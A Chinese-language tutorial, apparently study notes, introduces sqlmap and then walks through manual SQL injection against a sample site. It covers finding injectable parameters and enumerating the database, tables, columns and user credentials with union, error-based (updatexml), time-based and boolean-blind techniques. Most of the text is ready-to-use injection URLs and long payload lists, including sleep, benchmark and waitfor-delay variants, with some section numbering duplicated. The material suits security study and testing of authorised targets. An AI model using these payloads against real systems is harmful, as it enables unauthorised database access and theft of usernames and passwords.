
# 一、SQLMAP简介
SQLMAP是一个开放源代码渗透测试工具，它可以自动检测和利用SQL注入漏洞并接管数据库服务器的过程。它具有强大的检测引擎，针对最终渗透测试仪的众多细分功能以及从数据库指纹识别，从数据库获取数据到访问基础文件系统以及通过外出在操作系统上执行命令的多种开关。

	当SQLMAP识别到`http://192.168.136.131/SQLMAP/mysql/get_int.php?id=1`这么一个URL的时候，它会：

1. 判断可注入的参数
2. 判断可以用那种SQL注入技术来注入
3. 识别出哪种数据库
4. 根据用户选择，读取哪些数据

**SQLMAP支持五种不同的注入模式：**

1. 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2. 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4. 联合查询注入，可以使用union的情况下的注入。
5. 堆查询注入，可以同时执行多条语句的执行时的注入。

**SQLMAP支持的数据库：**`MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxD`


# 二、SQL-Payload分析

## 2.1、判断注入点
**2.1.1、通用判断方法**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="select * from users where id='$id' limit 0,1"`

当我们输入`http://xmtxsec.top/test.php/?id=1'`<br />实际执行的SQL语句为：`select * from users where id='1'' limit 0,1`<br />**分析：**此时SQL语句中的语法存在错误，Web页面会给我们返回错误。

这时可以继续输入：`http://xmtxsec.top/test.php/?id=1'--+`<br />此时的SQL语句为：`select * from users where id='1'--+' limit 0,1`<br />**分析：**此时真正执行的SQL语句为`select * from users where id='1'`，Web页面正常回显，说明此处存在SQL注入。

**类似的Payload有：**
```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator
@variable	local variable
@@variable	global variable
# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
Finding the table name
Time-Based:
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
Comments:
#	    Hash comment
/*  	C-style comment
-- -	SQL comment
;%00	Nullbyte
`	    Backtick
```

**2.1.2、基于误差的判断方法**<br />在大多数时候Web服务器关闭了错误回显，导致无法判断构造的SQL攻击语句是否成功执行，这时就可以使用基于误差的判断方法来进行判断。

设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`select aaa,bbb,ccc from tests where id = $id  `

当我们输入`http://xmtxsec.top/test.php/?id=1 and 1=2`<br />执行的SQL语句为：`select aaa,bbb,ccc from tests where id = 1 and 1=2`<br />**分析：**`and 1=2`永远为假，所以这条SQL语句的`and`条件永远无法成立。返回的页面结果将为空或者是一个出错页面，无法判断是否存在注入。

这时可以继续输入：`http://xmtxsec.top/test.php/?id=1 and 1=1`<br />执行的SQL语句为：`select aaa,bbb,ccc from tests where id = 1 and 1=1`<br />**分析：** `id = 1 and 1=1`永远为真，如果页面正常返回了，则说明SQL语句的`and`成功执行，那么就可以判断`id`参数存在SQL注入漏洞。

**类似的Payload有：**
```
 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
```

**2.1.3、基于时间的判断方法**<br />基于时间的判断方法与基于误差的判断方法使用情景相似，不同的是在基于时间的判断方法中是利用`sleep()`或`benchmark()`等函数让MySQL的执行时间变长。时间盲注多与`if(expr1,expr2,expr3)`结合使用。

设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`

当我们输入`http://xmtxsec.top/test.php/?id=1`<br />执行的SQL语句为：`SELECT * FROM users WHERE id='1' LIMIT 0,1`<br />**分析：**`id=1`永远为真，所以这条SQL语句永远成立。返回的页面结果正确。

这时可以继续输入：`http://xmtxsec.top/test.php/?id=1' and sleep(5)--+`<br />执行的SQL语句为：`SELECT * FROM users WHERE id='1' and sleep(5)--+' LIMIT 0,1`<br />**分析：** 此时真正执行的SQL语句为`SELECT * FROM users WHERE id='1' and sleep(5)`，`id=1`永远为真，如果页面正常返回了，并且是延迟了5秒才返回，则说明SQL语句的`and`成功执行，那么就可以判断`id`参数存在SQL注入漏洞。

**类似的Payload有：**
```
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```


## 2.2、查询当前数据库
**2.2.1、Union注入**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="select * from users where id='$id' limit 0,1"`

当我们输入：
```
http://xmtxsec.top/test.php/?id=-1' union select database()--+
```

实际执行的SQL语句为：
```
select * from users where id='-1' union select database()
```

**分析：**`id=-1`为假执行后面的SQL语句，所以页面返回当前数据库名称。
![image.png](_img/02-Web安全/01-基础知识/1664331214976-8428871a-7b92-467f-8b8d-4f8156351bd0.png)

**2.2.2、报错注入**<br />在一些场景下可能存在页面什么都不回显的情况，这时就可以使用报错来进行注入。报错注入的原理就是通过构造特殊的报错语句，使MySQL数据库报错，使我们查询的内容显示在报错信息中，同时把报错信息显示在页面上。

**常用的报错函数有：**

1. updateXML()：XPATH语法错误产生报错。`updateXML`的第⼆个参数要求是xpath格式字符串，如果是非法格式就会报错，并将非法格式内容返回。
2. extractvalue()：XPATH语法错误产生报错。`extractvalu`的第⼆个参数要求是xpath格式字符串，如果是非法格式就会报错，并将非法格式内容返回。
3. floor()：`group by` 对`rand()`函数进行操作时产生错误。

设有一个登陆页面后台SQL语句为：
```
$row1 = $row['username']
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'"
```

当我们输入：
```
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#&submit=Submit
```

实际执行的语句为：
```
UPDATE users SET password = '' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

**分析：**`password = ''`为假，然后执行后面的语句`updatexml(1,concat(0x7e,(select database()),0x7e),1)`，所以页面会回显出当前数据库名称。
![image.png](_img/02-Web安全/01-基础知识/1664332325013-c2b2ddd6-ed6b-4ead-b06e-3e757022f7bc.png)

**2.2.3、时间盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`

**判断当前数据库名称的字符数**<br />当我们输入
```
http://xmtxsec.top/test.php/?id=1' and if(length(database())=8,1,sleep(5))--+
```

实际执行的SQL语句为：
```
SELECT * FROM users WHERE id='1' and if(length(database())=8,1,sleep(5))
```

**分析：**`id='1'`为真，紧接着执行后面的if语句判断当前数据库名称的字符数是不是8，是则立即返回结果，不是则延迟5秒返回结果。

**判断数据库名称**<br />当我们输入
```
http://xmtxsec.top/test.php/?id=1' and if(substr((select database()),1,1)='s',1,sleep(5))--+
```

实际执行的SQL语句为：
```
SELECT * FROM users WHERE id='1' and if(substr((select database()),1,1)='s',1,sleep(5))
```

**分析：**`id=1`永远为真，紧接着执行后面的if语句判断当前数据库名称的第一个字符是不是s，是则正常返回结果，不是则页面延迟5面返回结果。以此类推可以得到数据库名称。

**补充：**这里手动判断比较耗时间，可以使用BP进行爆破。
![image.png](_img/02-Web安全/01-基础知识/1664333072784-a91093a4-608f-4dd1-8354-eb3ed0a75af5.png)

**2.2.4、布尔盲注**<br />布尔盲注和时间盲注差不多，唯一的区别是布尔盲注没有使用`if`函数进行延迟回显，可以直接通过页面上返回的结果来判断对错。

设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`select aaa,bbb,ccc from tests where id = '$id'  `

**判断当前数据库名称的字符数**<br />当我们输入：
```
http://xmtxsec.top/test.php/?id=1' and length(database())=8--+
http://xmtxsec.top/test.php/?id=1' and length(database())=9--+
```

实际执行的SQL语句为：
```
select aaa,bbb,ccc from tests where id = '1' and length(database())=8
select aaa,bbb,ccc from tests where id = '1' and length(database())=9
```

**分析：**`id = '1'`为真，紧接着判断数据库名称的字符数，等于8是时页面返回正常，等于9时页面返回错误，说明数据库名称字符数为8。
![image.png](_img/02-Web安全/01-基础知识/1664333625442-ff42ef74-80a8-4b9b-bd4d-4692b934471c.png)
![image.png](_img/02-Web安全/01-基础知识/1664333655259-ad27c19b-fa34-4793-ad81-f7462c0e10a2.png)

**判断当前数据库名称**<br />当我们输入：
```
http://xmtxsec.top/test.php/?id=1' and substr((select database()),1,1)='s'--+
```

实际执行的SQL语句为：
```
select aaa,bbb,ccc from tests where id = '1' and substr((select database()),1,1)='s'
```

**分析：**`id = '1'`为真，紧接着判断数据库名称的第一个字符，等于s是时页面返回正常，不等于等于s时页面返回错误，说明数据库名称的第一个字符为s。
![image.png](_img/02-Web安全/01-基础知识/1664342919896-46096f03-1ca3-461a-9cb0-cca02fc47f49.png)
![image.png](_img/02-Web安全/01-基础知识/1664342935071-2be1223a-5cce-40c8-b113-66e77e3083cc.png)



## 2.3、查询数据表
**2.3.1、Union注入**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="select * from users where id='$id' limit 0,1"`

当我们输入：
```
http://xmtxsec.top/test.php/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

真正执行的SQL语句为：
```
select * from users where id='-1' union select group_concat(table_name) from information_schema.tables where table_schema='security'
```

**分析：**`id=-1`为假，紧接着执行后面的SQL语句，使用group_concat函数将所有结果汇总到一起输出，所以页面返回security数据库里的所有数据表。
![image.png](_img/02-Web安全/01-基础知识/1664334051350-f846de3e-f7f5-4a18-a4b2-4314347ef956.png)

**2.3.2、报错注入**<br />设有一个登陆页面后台SQL语句为：
```
$row1 = $row['username'];  	
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
```

当我们输入：
```
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) #&submit=Submit
```

实际执行的语句为：
```
UPDATE users SET password = '' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)
```

**分析：**`password = ''`为假，然后执行后面的语，所以页面会通过updatexml函数报错回显出security数据库里面的数据表，可以通过修改limit来查出所有的表。
![image.png](_img/02-Web安全/01-基础知识/1664334671147-910be957-fc8e-45b0-a306-a52b3f5b4bdd.png)

**2.3.3、时间盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`

**判断当前数据库名称的字符数**<br />当我们输入
```
http://xmtxsec.top/test.php/?id=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(5))--+
```

实际执行的SQL语句为：
```
SELECT * FROM users WHERE id='1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(5))
```

**分析：**`id='1'`为真，紧接着执行后面的if语句判断security数据库中的第一个表的名称的第一个字符是不是e，是则立即返回结果，不是则延迟5秒返回结果。

同上面一样可以使用BP进行爆破
![image.png](_img/02-Web安全/01-基础知识/1664342194131-505817f1-5cb5-4937-bf07-53f280288f54.png)

**2.3.4、布尔盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`select aaa,bbb,ccc from tests where id = '$id'  `

当我们输入：
```
http://xmtxsec.top/test.php/?id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+
```

实际执行的SQL语句为：
```
select aaa,bbb,ccc from tests where id = '1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'
```

**分析：**`id = '1'`为真，紧接着判断security数据库里的第一个表名的第一个字符是不是e，是则页面返回正常，不是则页面返回错误。
![image.png](_img/02-Web安全/01-基础知识/1664343113730-72c48f5a-5509-467c-b1ed-f26b335e50cf.png)
![image.png](_img/02-Web安全/01-基础知识/1664343125357-9a8e499f-2cfb-4cb2-bd00-2d45ead03ad3.png)


## 2.4、查询表里的字段
**2.4.1、Union注入**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="select * from users where id='$id' limit 0,1"`

当我们输入：
```
http://xmtxsec.top/test.php/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

真正执行的SQL语句为：
```
select * from users where id='-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
```

**分析：**`id=-1`为假，紧接着执行后面的SQL语句，使用group_concat函数将所有结果汇总到一起输出，所以页面返回security数据库里的users表里的字段。
![image.png](_img/02-Web安全/01-基础知识/1664334192556-44e12435-e530-427a-9673-502e243e2988.png)

**2.1.2、报错注入**<br />设有一个登陆页面后台SQL语句为：
```
$row1 = $row['username'];  	
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
```

当我们输入：
```
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1) #&submit=Submit
```

实际执行的语句为：
```
UPDATE users SET password = '' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)
```

**分析：**`password = ''`为假，然后执行后面的语，所以页面会通过updatexml函数报错回显出security数据库里面的users数据表的字段，可以通过修改limit来查出所有的字段。
![image.png](_img/02-Web安全/01-基础知识/1664335300707-9f6717b3-a0aa-4c09-9615-989e059951a2.png)

**2.1.3、时间盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`

当我们输入
```
http://xmtxsec.top/test.php/?id=1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(5))--+
```

实际执行的SQL语句为：
```
SELECT * FROM users WHERE id='1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(5))
```

**分析：**`id='1'`为真，紧接着执行后面的if语句判断security数据库中的users表的第一个字段的第一个字符是不是是不是u，是则立即返回结果，不是则延迟5秒返回结果。

同上面一样可以使用BP爆破
![image.png](_img/02-Web安全/01-基础知识/1664342327536-c5f27b8e-8b87-444e-8593-ad7d0362f258.png)

**2.1.2、布尔盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`select aaa,bbb,ccc from tests where id = '$id'  `

当我们输入：
```
http://xmtxsec.top/test.php/?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u'--+
```

实际执行的SQL语句为：
```
select aaa,bbb,ccc from tests where id = '1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u'
```

**分析：**`id = '1'`为真，紧接着判断security数据库里的users表的第一个字段的第一个字符是不是u，是则页面返回正常，不是则页面返回错误。
![image.png](_img/02-Web安全/01-基础知识/1664343231352-c905bb31-1ac2-4b46-987e-8c1af7dc4373.png)
![image.png](_img/02-Web安全/01-基础知识/1664343244401-e4835b3a-f2b1-4f45-9ec3-c3ebd003b9e8.png)


## 2.5、查询数据
**2.5.1、Union注入**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="select * from users where id='$id' limit 0,1"`

当我们输入：
```
http://xmtxsec.top/test.php/?id=-1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users--+
```

真正执行的SQL语句为：
```
select * from users where id='-1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users
```

**分析：**`id=-1`为假，紧接着执行后面的SQL语句，使用group_concat函数将所有结果汇总到一起输出并使用concat_ws函数用`-`将username和password字段进行分割。
![image.png](_img/02-Web安全/01-基础知识/1664335861035-2de2d564-7fdb-4644-b801-666c24356e79.png)

**2.5.2、报错注入**<br />这里查询users表出问题，改为查询**emails**表来演示<br />设有一个登陆页面后台SQL语句为：
```
$row1 = $row['username'];  	
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
```

当我们输入：
```
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select group_concat(id,email_id) from security.emails),0x7e),1) #&submit=Submit
```

实际执行的语句为：
```
UPDATE users SET password = '' or updatexml(1,concat(0x7e,(select group_concat(id,email_id) from security.emails),0x7e),1)
```

**分析：**`password = ''`为假，然后执行后面的语，所以页面会通过updatexml函数报错回显出security数据库里面的emails数据表的id和email_id字段。
![image.png](_img/02-Web安全/01-基础知识/1664335538133-119ac525-4e4e-4542-a30e-a390cde1d308.png)

**2.5.3、时间盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"`

当我们输入
```
http://xmtxsec.top/test.php/?id=1' and if(substr((select group_concat(concat_ws('-',username,password)) from security.users limit 0,1),1,1)='d',1,sleep(1))--+
```

实际执行的SQL语句为：
```
SELECT * FROM users WHERE id='1' and if(substr((select group_concat(concat_ws('-',username,password)) from security.users limit 0,1),1,1)='d',1,sleep(1))
```

**分析：**`id='1'`为真，紧接着执行后面的if语句判断security数据库中的users表的username和password字段的值得第一个字符是不是d，并且使用concat_ws函数将username和password字段用`-`分割，使用group_concat函数将username和password字段一起输出。是则立即返回结果，不是则延迟5秒返回结果。

同上面一样可以使用BP爆破
![image.png](_img/02-Web安全/01-基础知识/1664342704136-26a9f02d-861f-4855-b2e5-fb5fc2e97f09.png)

**2.5.4、布尔盲注**<br />设有一个URL为：`http://xmtxsec.top/test.php/?id=1`<br />后台SQL语句为：`select aaa,bbb,ccc from tests where id = '$id'  `

当我们输入：
```
http://xmtxsec.top/test.php/?id=1' and substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d'--+
```

实际执行的SQL语句为：
```
select aaa,bbb,ccc from tests where id = '1' and substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d'--+
```

**分析：**`id = '1'`为真，紧接着判断security数据库里的users表的username和password字段，判断username字段的第一个值得第一个字符是不是d，是则页面返回正常，不是则页面返回错误。
![image.png](_img/02-Web安全/01-基础知识/1664343437489-818d76fe-bce8-4122-a50f-3e8c5f0bcd5d.png)
![image.png](_img/02-Web安全/01-基础知识/1664343454931-c9831e4e-8759-4415-bfb8-e95c9d9b55dd.png)

**类似的SQL注入-Payload有：**
```
ORDER BY SLEEP(5)
 ORDER BY 1,SLEEP(5)
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
